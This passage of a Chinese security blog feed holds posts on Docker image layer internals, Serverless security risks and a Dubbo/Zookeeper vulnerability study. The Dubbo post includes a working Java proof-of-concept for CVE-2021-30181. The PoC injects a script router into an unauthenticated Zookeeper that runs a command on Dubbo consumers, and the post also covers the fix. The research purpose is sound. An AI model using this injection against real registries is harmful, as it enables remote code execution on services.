/bin/sh -c #(nop) <span class="hljs-variable constant_">WORKDIR</span> /usr/local/tomcat     0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c mkdir -p <span class="hljs-string">&quot;$CATALINA_HOME&quot;</span>            0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/usr/</span>local/tomca…   0B                  <br>&lt;missing&gt;           <span class="hljs-number">12</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">CATALINA_HOME</span>=<span class="hljs-regexp">/usr/</span>lo…   0B                  <br>&lt;missing&gt;           <span class="hljs-number">13</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">CMD</span> [<span class="hljs-string">&quot;jshell&quot;</span>]               0B                  <br>&lt;missing&gt;           <span class="hljs-number">13</span> days ago         /bin/sh -c set -eux;   arch=<span class="hljs-string">&quot;$(dpkg --print-…   343MB               </span><br><span class="hljs-string">&lt;missing&gt;           13 days ago         /bin/sh -c #(nop)  ENV JAVA_VERSION=11.0.12     0B                  </span><br><span class="hljs-string">&lt;missing&gt;           13 days ago         /bin/sh -c #(nop)  ENV LANG=C.UTF-8             0B                  </span><br><span class="hljs-string">&lt;missing&gt;           13 days ago         /bin/sh -c #(nop)  ENV PATH=/usr/local/openj…   0B                  </span><br><span class="hljs-string">&lt;missing&gt;           13 days ago         /bin/sh -c &#123; echo &#x27;#/bin/sh&#x27;; echo &#x27;echo &quot;</span>$J…   27B                 <br>&lt;missing&gt;           <span class="hljs-number">13</span> days ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">JAVA_HOME</span>=<span class="hljs-regexp">/usr/</span>local/…   0B                  <br>&lt;missing&gt;           <span class="hljs-number">13</span> days ago         /bin/sh -c set -eux;  apt-get update;  apt-g…   <span class="hljs-number">11.</span>1MB              <br>&lt;missing&gt;           <span class="hljs-number">2</span> weeks ago         /bin/sh -c apt-get update &amp;&amp; apt-get install…   146MB               <br>&lt;missing&gt;           <span class="hljs-number">2</span> weeks ago         /bin/sh -c set -ex;  <span class="hljs-keyword">if</span> ! command -v gpg &gt; /…   <span class="hljs-number">17.</span>5MB              <br>&lt;missing&gt;           <span class="hljs-number">2</span> weeks ago         /bin/sh -c set -eux;  apt-get update;  apt-g…   <span class="hljs-number">16.</span>5MB              <br>&lt;missing&gt;           <span class="hljs-number">2</span> weeks ago         /bin/sh -c #(nop)  <span class="hljs-variable constant_">CMD</span> [<span class="hljs-string">&quot;bash&quot;</span>]                 0B                  <br>&lt;missing&gt;           <span class="hljs-number">2</span> weeks ago         /bin/sh -c #(nop) <span class="hljs-variable constant_">ADD</span> <span class="hljs-attr">file</span>:e952f6979e4b0ead0…   114MB               <br></code></pre></td></tr></table></figure><p>一般从docker仓库拉取下来的子镜像层ID都为<missing>，但我们自己创建的镜像则是有子镜像层ID的。</p><p>我们也可以通过查看docker文件系统目录来查看镜像信息:(这里以overlay2文件存储驱动为例)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/image/overlay2/imagedb/content/sha256/镜像<span class="hljs-variable constant_">ID</span>（这里的<span class="hljs-variable constant_">ID</span>与docker images里的镜像一致）<br></code></pre></td></tr></table></figure><p>这个json文件存储里镜像的所有操作记忆rootfs的子镜像层。</p><h2 id="二、子镜像层"><a href="#二、子镜像层" class="headerlink" title="二、子镜像层"></a>二、子镜像层</h2><p>查询子镜像层，可通过overlay文件系统目录查询：（还有一种在打包镜像的那个栏目中提及）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript">root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/overlay2# ls<br>034932a05e2615e6665be7c2c924c33ae38f849b54510f828152b0686f49e3c7<br>0dfa1abb8e56c8be300f5dd4086a3d8eaa921afa94f2fec2089e382e3678cf1f<br>14bfdf5f04751a90f0d8c17b909c321723c09d39622ef1ff9304f6a6177d3f9a<br>1d0dbb5b4d588440fe2a089b9c3cd06b134c4520f67f7ac7f4e5864ab661f2da<br>1d3f27228a5f942b3299859ab4cd6d139eb739b795e4605456144eebfe65241c<br>251d6c3825fa93e16f8319a14cf84720b1eadc35eb8396bad50d157602e5ff8a<br>29e8e1ee22646dea3203a7eed91e9979be655b3dd10f9cad9e87062b571cd545<br>2ae86148901fbde20f7aab0b1a3b675aa73d3ce75e9b5b2144895b852e15fc5a<br>2b340cb26c4f7566fdaf47a6cc258c92dd0aa4d1a67258a219d50a617c508642<br>37a99f751233eaca857347f61075fbd83a46d899994ba2d15744d74a492ead80<br>4f8e610e830a3f8a307dc96b149c58e75472feebb6087fc945e6f06f3e773fa6<br>535d338ea90554c5b788936f94fbaaa8860ac3587e9c4adf28fccc0f9ba38409<br>53ab98fca768e9d1b86d85616c71ec93d0ee5a4ad86061f9a3a215b69c3246b8<br>58bff18ee2d0d1433c101d9e96f16a0d801975a3f81db84c0ff9a9f7364c9c60<br>642e463f3597e3eade330a6d7db00d10d54034d9fed6b48921d2b081ba05815d<br>696cc70befcb80a81c8c178263f4651059a2ea3f601fdb194089e8ff30e7cdc8<br>75419a832a2717cfe1a0cd2424c7f14c2130a6253ddc7d3d238520145a15ad34<br>88f84ce826c70d00a0d5c52c9adc323efd99b6e99572d6a08ab992912dce0a15<br>8d49811c801202c1f3214cf2ef7b486048a533cb2b4480770c96bdf802cfb852<br>8f9748ad9bdd1232ec8f60729d90055a9e1bb37611aae247939cda15a20995fa<br>934781a321cb6dba0171392b8eb03aadfc5ba83938d8957b789dd1043b39e71f<br></code></pre></td></tr></table></figure><p>这全都是子镜像层，他们是杂乱的不知道哪个子镜像属于哪个镜像，可以通过索引来看子镜像层属于哪个镜像，上文中查看镜像ID所有内容的json文件中rootfs的子镜像为例，拿到子镜像ID，通过这个文件夹中的两个目录</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/image/overlay2/distribution# ls<br>diffid-by-digest  v2metadata-by-diffid<br></code></pre></td></tr></table></figure><p>互相查询索引，具体操作如下：</p><p>1、拿着子镜像层ID去v2metadata-by-diffid这个里面查询出一个号码</p><p>2、再拿着那个号码去diffid-by-digest这个里面拿一个号码</p><p>3、通过最终拿到的这个号码去下面的文件目录查询出一个子镜像层文件夹，里面存储着子镜像的一些描述信息（不是元文件），可以通过cache-id索引到&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2这个文件夹下的子镜像层。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/image/overlay2/layerdb/sha256/号码<span class="hljs-variable constant_">ID</span><br>root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/image/overlay2/layerdb/sha256/02c055ef67f5904019f43a41ea5f099996d8e7633749b6e606c400526b2c4b33# ls<br>cache-id  diff  size  tar-split.<span class="hljs-property">json</span>.<span class="hljs-property">gz</span><br></code></pre></td></tr></table></figure><p>终结上面的寻找小插曲，继续介绍&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2这个目录下的文件夹，他们都是每一子镜像层的元数据文件。这些元数据文件都存储在diff文件夹下（每一层修改的文件）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/overlay2# cd 034932a05e2615e6665be7c2c924c33ae38f849b54510f828152b0686f49e3c7/<br>root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/overlay2/034932a05e2615e6665be7c2c924c33ae38f849b54510f828152b0686f49e3c7# ls<br>diff  link  lower  work<br>root@<span class="hljs-attr">ubuntu</span>:<span class="hljs-regexp">/var/</span>lib/docker/overlay2/034932a05e2615e6665be7c2c924c33ae38f849b54510f828152b0686f49e3c7/diff# ls<br>etc  lib  tmp  usr  <span class="hljs-keyword">var</span><br></code></pre></td></tr></table></figure><p>我们可以看到这一子镜像层肯定是改了etc、lib、tmp、usr、var这些文件夹中的文件了。</p><h2 id="三、镜像打包"><a href="#三、镜像打包" class="headerlink" title="三、镜像打包"></a>三、镜像打包</h2><p>我们可以先通过docker save命令将镜像打包成一个压缩包：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">fanxinyu@<span class="hljs-attr">ubuntu</span>:~$ docker save -o /home/fanxinyu/tocmat.<span class="hljs-property">tar</span> 46cfbf1293b1<br></code></pre></td></tr></table></figure><p>然后我们查看压缩包中内容就是一个镜像中所有的层，并且还有一个叫做manifest.json的描述文件存储着层的顺序结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[&#123;<span class="hljs-string">&quot;Config&quot;</span>:<span class="hljs-string">&quot;46cfbf1293b176161813fa05bb8f7e82df1ec7def5c226c48bc48a60ed305ac7.json&quot;</span>,<span class="hljs-string">&quot;RepoTags&quot;</span>:<span class="hljs-literal">null</span>,<br><span class="hljs-string">&quot;Layers&quot;</span>:[<span class="hljs-string">&quot;ce945bc5d9976d3bb3406718003bec9354e498bb5aac8a53af6cb9f744e0d8e8/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;e88600dc945c0c6ac9c53a7341eaed1eaaa4a74f68b207cd4eeaa70e64781da1/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;e490c2634e42e7dd203c422ed3411d157bac4cb365a9c6625aeb0366337f6d8c/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;10ba19cb154d35d098f7fb9281aee5286203bf69f09c3d5ef6f6e3c22a575cfb/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;da52df413b96b9950c14ac49052917cca11f147281131abf3e5851178a1da725/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;5e0b05ce7a5b3a61fb022100f426eba7d779e7c3ce228f6083f2071d6b63d7b6/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;0f3b22ab2e781e07560be3ab959c0e75999bfc0f52174686c336f0c201c425ed/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;9b98f99c20683407f916e6c26a2f8173ee40649a951ead3c34ab3a8d34aaa254/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;1577c0719014ef6aa7e14b48c2366a72d533d7d9ca630816d927b71f999b9837/layer.tar&quot;</span>,<br><span class="hljs-string">&quot;a6e47ad1309a34eb923e2a9661986112ba2426fbd35adbf0f4f88d0ba99a731b/layer.tar&quot;</span>]&#125;]<br></code></pre></td></tr></table></figure><p><img src="/Docker%E9%95%9C%E5%83%8F%E5%88%86%E6%9E%90/WEBRESOURCE345586d3a4df28fff5cbe6c76f141627.png"></p><p>我们可以通过docker history里面的层对应这个文件目录中的层，也可以通过对比层的大小来对应找出自己想要的文件，例如找一个spring项目的classes字节码文件啥的。</p><p>这里也是trivy镜像检测工具的实现原理，通过打包镜像进行镜像内容的安全组件检测扫描。</p>]]></content>
    
    
    
    <tags>
      
      <tag>云安全</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Serverless架构安全概览</title>
    <link href="/2023/03/27/Serverless%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/"/>
    <url>/2023/03/27/Serverless%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/</url>
    
    <content type="html"><![CDATA[<h2 id="一、什么是Serverless"><a href="#一、什么是Serverless" class="headerlink" title="一、什么是Serverless"></a>一、什么是Serverless</h2><p>软件即服务，即SaaS。SaaS是通过互联网向终端用户按需提供集中托管和管理的软件(例如Gmail、Slack、Jira、SAP、Salesforce)。这些通常是云原生应用程序。</p><p>基础设施即服务，即IaaS (Infrastructure as a Service，简称IaaS)。IaaS可以提供网络、数据存储和计算机等必须由最终用户管理的资源。</p><p>平台即服务，即PaaS，建立在IaaS之上。PaaS允许用户在托管平台上部署和运行应用程序。</p><p>函数即服务(Function as a Service，简称FaaS)，FaaS是一种特殊类型的PaaS，允许用户在托管平台(例如AWS Lambda)上开发、管理和运行应用程序功能。</p><p><img src="/./Serverless%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/WEBRESOURCE2d50559ae5423671d66597d10bae6817.png"></p><h2 id="二、对比Paas的优点："><a href="#二、对比Paas的优点：" class="headerlink" title="二、对比Paas的优点："></a>二、对比Paas的优点：</h2><ol><li>使用方面的优点:</li></ol><p>1)应用部署更方便、更快捷；</p><p>2)资源分配灵活、可伸缩；</p><p>3)可访问性提升、延迟缩减；</p><p>4)服务滚动更新。</p><ol><li>安全方面的优点：</li></ol><p>不必再担心服务器级别的安全性，并且可以有效地将管理和保护服务器所需的所有基础设施外包出去。</p><p>1)对易受攻击的操作系统(OS)的依赖:不再需要给服务器打补丁了。</p><p>2)拒绝服务(DoS):Serverless可自动伸缩，可以灵活地满足容量需求，可以避免出现这种问题。</p><p>3)长期存在的受攻击服务器:Serverless的函数是无状态执行，自行快速销毁与创建。</p><h2 id="三、对比PaaS相似点（中性）"><a href="#三、对比PaaS相似点（中性）" class="headerlink" title="三、对比PaaS相似点（中性）"></a>三、对比PaaS相似点（中性）</h2><ol><li>权限和授权</li></ol><p>函数的权限都不太安全。几个问题：</p><p>谁能够调用函数?谁可以访问代码和环境变量?当有一系列的函数，其中一个被破坏，会发生什么?被破坏的函数能否访问敏感数据或继续破坏另一个函数?</p><ul><li>解决方式：</li></ul><p>1)使用“最小权限”原则，给予每个函数最小的权限。但随着功能的增加，任何策略的自然状态都是不断扩展的。</p><p>2)单独考虑功能，为每个功能制定单独的策略。不过，这很难大规模实现。(自动化流程的工具正在开发中，下面会详细介绍。)</p><ol><li>保护静态数据–关键</li></ol><p>在Serverless应用的情况下，不能将状态(例如，临时令牌、密码、会话id)存储在服务器上，这意味着状态其存储在服务器外部。</p><ul><li>解决方式：建议数据加密、减小粒度和加强控制:</li></ul><p>1)加密所有敏感的持久数据；</p><p>2)加密所有敏感的离线数据；</p><p>3)最小化可以访问每个数据存储的函数；</p><p>4)为每个函数使用单独的数据库凭据，并控制这些凭据的作用；(例如，只允许访问特定的表或数据段)</p><p>5)监视什么功能正在访问什么数据(例如，使用AWS X-Ray等分析工具)。</p><ol><li>代码中的漏洞</li></ol><p>Serverless不保护应用层。不安全的代码逻辑，诸如SQL注入、跨站脚本、远程命令执行、伪造跨站请求等问题仍然是威胁。</p><ul><li>解决方式：参考一些标准的最佳实践:</li></ul><p>首先关注OWASP前10种攻击类型；</p><p>使用测试来分析代码，包括动态和静态应用程序安全测试；</p><p>标准化输入和输出处理库要经过安全审计；</p><p>尽可能严格地使用API网关模型&#x2F;模式；</p><p>独立保护每个功能，在其周围设置边界，这是最重要的策略。</p><ol><li>易受攻击的应用程序依赖</li></ol><p>Serverless函数通常利用应用程序依赖关系和第三方代码库（由开发者引入）。随着时间的推移，这些依赖关系被压缩和遗忘，变得陈旧和脆弱。</p><ul><li>解决方式：</li></ul><p>虽然平台可以管理操作系统依赖关系，但开发者仍然需要负责管理应用程序依赖关系。目前，越来越多的工具可以帮助识别和修复漏洞。</p><h3 id="四、对比PaaS的缺点"><a href="#四、对比PaaS的缺点" class="headerlink" title="四、对比PaaS的缺点"></a>四、对比PaaS的缺点</h3><ol><li>第三方服务和传输中的数据安全</li></ol><p>在Serverless的情况下，与第三方服务交互时。应该慎重考虑:</p><p>正在传输的是什么数据?第三方服务对数据的保护情况如何?</p><p>传输中的数据是否安全或者加密?是否在VPC（专有网络）中?数据是否使用HTTPS协议?</p><p>你在和谁对话?能验证对方使用的HTTPS证书吗?</p><p>响应是否可信任？如果服务被攻击了，是否可以利用它来损害您的利益?</p><p>如何存储API密钥?尽管代码的无状态性使得人们倾向于在GitHub和其他存储库中存储凭据，但最好使用KMS（密钥管理服务）和环境变量。</p><ul><li>解决方法：</li></ul><p>使用安全监测和性能监视工具。由于这是一个新兴的领域，新的工具正在出现，找到适合自己的工具。</p><p>同时也要担心本地服务，不安全的功能可能导致你的系统崩溃。</p><ol><li>攻击面——又名“函数问题”</li></ol><p><img src="/./Serverless%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/WEBRESOURCE0f5c6508922f3444fb7b7fb84b061e83.png"></p><p>Serverless允许更大的粒度，这反过来意味着更大的灵活性。各种函数的组合调用灵活，增加了风险，产生各种意想不到的后果。</p><ul><li>解决方法：专注于建立边界和监控性能:（关注细粒度）</li></ul><p>把每一个功能都看作是需要保护的边界。当查找安全性问题时，先查找函数的问题，然后再查找有关应用程序的信息；</p><p>独立测试每个功能是否存在安全缺陷；</p><p>不要依赖于限制对函数的访问，因为访问控制会随着时间的推移而变化；</p><p>搭建库模型，使用共享输入&#x2F;输出处理库，从而可以更安全地处理输入；</p><p>将功能限制在实际需要的范围内。尽量确定每个函数允许的最小值，减少到“最低特权”；</p><p>监控单个函数和整个流程。虽然这很理想，但是鉴于工具短缺，需要了解数据如何在系统中运行并快速检测异常活动。</p><ol><li>安全监视</li></ol><p>Serverless环境使得部署函数比以往更容易、更简单。函数很容易添加，但很难删除。由于函数的策略自然会扩展，并且成本不再驱动删除，所以最终会得到大量具有过度开放策略的函数。函数越多，策略越多，管理成本越大，风险就越大。</p><ul><li>解决方法：建议有条理地盘点和管理函数:</li></ul><p>部署之前要考虑，这个函数真的是必须得吗？</p><p>函数分类配置权限：为不同的功能组分别配置网络和帐户，把函数放在对象存储中(例如，定时任务)，这样您就知道什么是一次性的，什么不是一次性的。并给他们设置不同的权限；</p><p>跟踪已经部署的应用及其使用情况，不要仅仅依赖平台的能力；</p><p>优先最小化权限；</p><p>减少权限混乱；</p><p>监控已知的漏洞。</p><h2 id="五、使用需关注"><a href="#五、使用需关注" class="headerlink" title="五、使用需关注"></a>五、使用需关注</h2><ol><li><p>需要考虑如何控制扩大的中性风险。这包括在策略和边界中更细粒度、更少许可、加密某些数据、分析函数的数据访问，以及使用测试和工具来查找和修复漏洞。</p></li><li><p>需要关注已经变得更糟的安全风险。这包括注意如何使用第三方服务、执行函数的独立安全测试、限制功能、考虑库模型、监视函数和流、减少权限以及减少和跟踪函数的部署。</p></li><li><p>研究适合自己需求的Serverless安全扫描器和测试服务。每时每刻新产品都会涌现，但其中许多仍然是未经证实的。一定要做好研究，明智投资。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>云安全</tag>
      
      <tag>Serverless</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DUBBO安全研究--Zookeeper篇</title>
    <link href="/2023/03/27/DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/"/>
    <url>/2023/03/27/DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>云环境下，Dubbo作为常用的开源高性能优秀的服务框架，在广泛使用的同时，更应关注其安全性。其架构中包含Provider、Consumer、Registry、Monitor。可从这几点展开讨论其安全性。</p><h2 id="二、风险分析"><a href="#二、风险分析" class="headerlink" title="二、风险分析"></a>二、风险分析</h2><p>注册中心分为：Multicast注册中心、Zookeeper注册中心、Redis注册中心、Simple注册中心。</p><p>zookeeper最为常用，以zookeeper为例，分析微服务架构中注册中心面临的威胁。</p><p>1、漏洞：关于注册中心注入payload的高危命令执行漏洞有： CVE-2021-30181、CVE-2021-36162。</p><p>2、错误路由：通过查看zk中的provider接口，模仿其接口编码规范对consumer的调用进行干扰，影响业务。    </p><p> CVE-2021-30181影响范围                  </p><ul><li><p>使用Dubbo 2.5.x版本的所有用户。</p></li><li><p>使用Dubbo 2.6.10之前版本的所有用户。</p></li><li><p>使用Dubbo 2.7.10之前版本的所有用户。</p></li></ul><h2 id="CVE-2021-36162影响范围"><a href="#CVE-2021-36162影响范围" class="headerlink" title="CVE-2021-36162影响范围"></a>CVE-2021-36162影响范围</h2><ul><li><p>使用Dubbo 2.7.0到2.7.12的所有用户。</p></li><li><p>使用Dubbo 3.0.0 to 3.0.1的所有用户。</p></li><li><p>使用Dubbo-admin的所有用户。</p></li></ul><p>两个漏洞均是因为zookeeper未授权访问导致的script脚本&#x2F;yaml解析命令执行。</p><h2 id="三、威胁利用"><a href="#三、威胁利用" class="headerlink" title="三、威胁利用"></a>三、威胁利用</h2><h3 id="1、CVE-2021-30181"><a href="#1、CVE-2021-30181" class="headerlink" title="1、CVE-2021-30181"></a>1、CVE-2021-30181</h3><p>实验环境dubbo 2.7.6</p><p>参考文章：<a href="https://threedr3am.github.io/2021/05/30/Dubbo%20Consumer%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5RCE%20-%20CVE-2021-30181/">https://threedr3am.github.io/2021/05/30/Dubbo%20Consumer%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5RCE%20-%20CVE-2021-30181/</a></p><p>此漏洞通过向注册中心注入script脚本进行攻击利用，攻击目标为consumer。</p><p>在consumer调用provider时，会先到注册中心（zk）中查看路由（routers），根据路由的策略，调用相关的provider。dubbo存在心跳检测机制，如果向zk注入恶意命令执行router策略，会立马执行，因为consumer会定时RPC发送心跳包到provider。</p><p>Zookeeper中每个服务节点的目录为：</p><p>configurators</p><p>providers</p><p>routers</p><p>这些node下的内容变动时，consumer的Zookeeper监听器会watch到，然后通知到org.apache.dubbo.registry.integration.RegistryDirectory#notify方法，更新相关数据。</p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCEd33e679f424f81308830ccea33d1bb49.png"></p><p>漏洞触发点：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> &lt;T&gt; List&lt;Invoker&lt;T&gt;&gt; route(List&lt;Invoker&lt;T&gt;&gt; invokers, URL url, Invocation invocation) throws RpcException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        Bindings bindings = <span class="hljs-keyword">this</span>.createBindings(invokers, invocation);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.function == <span class="hljs-literal">null</span> ? invokers : <span class="hljs-keyword">this</span>.getRoutedInvokers(<span class="hljs-keyword">this</span>.function.eval(bindings));<br>    &#125; <span class="hljs-keyword">catch</span> (ScriptException var5) &#123;<br>        logger.error(<span class="hljs-string">&quot;route error, rule has been ignored. rule: &quot;</span> + <span class="hljs-keyword">this</span>.rule + <span class="hljs-string">&quot;, method:&quot;</span> + invocation.getMethodName() + <span class="hljs-string">&quot;, url: &quot;</span> + RpcContext.getContext().getUrl(), var5);<br>        <span class="hljs-keyword">return</span> invokers;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>向zk中注入恶意script脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> dubbo;<br><br><span class="hljs-keyword">import</span> org.apache.dubbo.common.extension.ExtensionLoader;<br><span class="hljs-keyword">import</span> org.apache.dubbo.registry.Registry;<br><span class="hljs-keyword">import</span> org.apache.dubbo.registry.RegistryFactory;<br><br><span class="hljs-comment">//dubbo2.0 注册恶意script</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegisterRouters</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// 获取注册中心的扩展类</span><br>        <span class="hljs-type">RegistryFactory</span> <span class="hljs-variable">registryFactory</span> <span class="hljs-operator">=</span> ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();<br><br>        <span class="hljs-comment">// 获取注册中心，这里使用zk</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> registryFactory.getRegistry(org.apache.dubbo.common.URL.valueOf(<span class="hljs-string">&quot;zookeeper://127.0.0.1:2181&quot;</span>));<br><br>        <span class="hljs-comment">// 注册中心上配置规则</span><br>        registry.register(org.apache.dubbo.common.URL.valueOf(<span class="hljs-string">&quot;script://192.168.1.9/common.ProviderService?&quot;</span> +<br>                <span class="hljs-string">&quot;application=consumer&amp;category=routers&amp;check=false&amp;dubbo=2.0.2&amp;&quot;</span> +<br>                <span class="hljs-string">&quot;init=false&amp;interface=common.ProviderService&amp;methods=sayHello&quot;</span> +<br>                <span class="hljs-string">&quot;&amp;pid=4780&amp;release=2.7.6&amp;side=consumer&amp;sticky=false&amp;&quot;</span> +<br>                <span class="hljs-string">&quot;timestamp=1678326819280&amp;route=script&amp;type=javascript&amp;&quot;</span> +<br>                <span class="hljs-string">&quot;rule=s%3D%5B1%5D%3Bs%5B0%5D%3D&#x27;calc.exe&#x27;%3Bjava.lang.Runtime.getRuntime().exec(s)%3B&quot;</span>));<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>注入成功</p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCEa3009e7295e8c710a83e731454ab4e79.png"></p><p>启动consumer来解析script脚本</p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCEb9f32a1183cafa927ba8735f36484ce0.png"></p><p>漏洞解析：</p><p>入口点：</p><p>org.apache.dubbo.rpc.cluster.router.script.ScriptRouter</p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCE2adcc33b23bd156c928d75e7a77f2871.png"></p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCE0a6fe9b46f010de10eea5f5915884fce.png"></p><p>执行点：</p><p>org.apache.dubbo.rpc.cluster.router.script.route</p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCE0d36bc7add2bf447ea1fce339e26ba79.png"></p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCE3b86110e6a0ad726b94748026d2b188a.png"></p><p>调用栈：</p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCE95a58d41297829043fd0e5050e7871f1.png"></p><p>修复方案：</p><p>官方升级dubbo 2.7.10是通过禁用默认的ScriptRout解析来防止ScriptRoutor的注入，并再项目中加入开关，用户可自定义打开&#x2F;关闭开关。</p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCE20f4015c836eaf6fc1c8a9fa06430c7e.png"></p><p>添加此配置可开启ScriptRouter</p><p><img 